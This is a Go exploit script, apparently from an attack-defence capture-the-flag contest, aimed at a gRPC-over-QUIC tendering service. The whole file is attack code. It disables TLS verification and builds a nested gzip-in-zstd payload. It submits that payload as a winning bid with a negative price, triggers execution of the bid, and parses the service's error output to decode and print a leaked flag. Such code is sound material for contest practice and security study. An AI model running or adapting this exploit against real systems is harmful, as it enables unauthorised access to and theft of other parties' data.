package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os"
	"regexp"
	"time"

	pingerpb "gmtservice/pkg/proto/pinger"
	tenderspb "gmtservice/pkg/proto/tenders"
	qnet "gmtservice/pkg/quicrpc"

	"github.com/google/uuid"
	"github.com/klauspost/compress/zstd"
	"google.golang.org/grpc"
	"google.golang.org/grpc/metadata"
)

const servicePort = 9090

func main() {
	if len(os.Args) < 3 {
		fmt.Println("usage: sploit <host> <tender_id>")
		os.Exit(1)
	}

	host := os.Args[1]
	tenderID := os.Args[2]

	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"great_mettender"},
	}

	creds := qnet.NewCredentials(tlsConf)

	dialer := qnet.NewQuicDialer(tlsConf)
	grpcOpts := []grpc.DialOption{
		grpc.WithContextDialer(dialer),
		grpc.WithTransportCredentials(creds),
	}

	conn, err := grpc.Dial(fmt.Sprintf("%s:%d", host, servicePort), grpcOpts...)
	if err != nil {
		panic(err)
	}

	pingClient := pingerpb.NewPingerServiceClient(conn)
	bidsClient := tenderspb.NewBidServiceClient(conn)
	tendersClient := tenderspb.NewTendersServiceClient(conn)

	user := uuid.NewString()
	ctx := metadata.AppendToOutgoingContext(context.Background(), "user", user)
	if _, err := pingClient.Ping(ctx, &pingerpb.PingRequest{}); err != nil {
		panic(err)
	}

	// Craft the exploit program (cached).
	var payload string
	content, err := os.ReadFile("payload_cached")
	if err != nil {
		if errors.Is(err, fs.ErrNotExist) {
			payload = craftExploit()
			_ = os.WriteFile("payload_cached", []byte(payload), 0o600)
		} else {
			panic(err)
		}
	} else {
		payload = string(content)
	}

	// Make a winning bid with exploit program.
	bid := &tenderspb.Bid{
		TenderId:    tenderID,
		Price:       -1,
		Description: "pwn",
		Program:     payload,
	}
	createBid, err := bidsClient.Create(ctx, &tenderspb.Bid_CreateRequest{Bid: bid})
	if err != nil {
		panic(err)
	}

	fmt.Printf("exploit bid id is %s, waiting for the checker to close the tender\n", createBid.Bid.Id)

	for i := 0; i < 20; i++ {
		tender, err := tendersClient.Get(ctx, &tenderspb.Tender_GetRequest{Id: tenderID})
		if err != nil {
			panic(err)
		}
		fmt.Printf("Tender state: %v\n", tender)
		if !tender.Tender.Finished {
			time.Sleep(time.Second * 3)
			continue
		}
		break
	}

	fmt.Println("Executing bid...")
	_, err = bidsClient.Execute(ctx, &tenderspb.Bid_ExecuteRequest{Id: createBid.Bid.Id})
	if err == nil {
		panic("execution not errored")
	}
	fmt.Printf("Execution error: %v\n", err)

	inputRaw := regexp.MustCompile(` ([^ ]+)}, bid &\{`).FindStringSubmatch(err.Error())[1]
	println(inputRaw)
	input, err := decode(inputRaw)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Found flag: %s\n", input)
}

func craftExploit() string {
	step1 := bytes.Buffer{}
	for i := 0; i < 1000; i++ {
		w := gzip.NewWriter(&step1)
		_, _ = w.Write(nil)
		_ = w.Close()

		if i%100 == 0 {
			fmt.Printf("[CRAFT1] Done %d/1000\n", i)
		}
	}

	step2 := bytes.Buffer{}
	zstdw, _ := zstd.NewWriter(&step2, zstd.WithEncoderLevel(zstd.EncoderLevelFromZstd(9)))

	for i := 0; i < 4950; i++ {
		_, _ = io.Copy(zstdw, bytes.NewReader(step1.Bytes()))
		if i%1000 == 0 {
			fmt.Printf("[CRAFT2] Done %d/5000\n", i)
		}
	}
	_ = zstdw.Close()
	return base64.StdEncoding.EncodeToString(step2.Bytes())
}

// From interfuck.
func decode(s string) ([]byte, error) {
	step1, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil, fmt.Errorf("decoding step1: %w", err)
	}
	step2, err := zstd.NewReader(bytes.NewReader(step1))
	if err != nil {
		return nil, fmt.Errorf("decoder step2: %w", err)
	}
	step3, err := gzip.NewReader(step2)
	if err != nil {
		return nil, fmt.Errorf("decoder step3: %w", err)
	}

	res, err := io.ReadAll(io.LimitReader(step3, 1000))
	if err != nil {
		return nil, fmt.Errorf("reading data: %w", err)
	}
	return res, nil
}
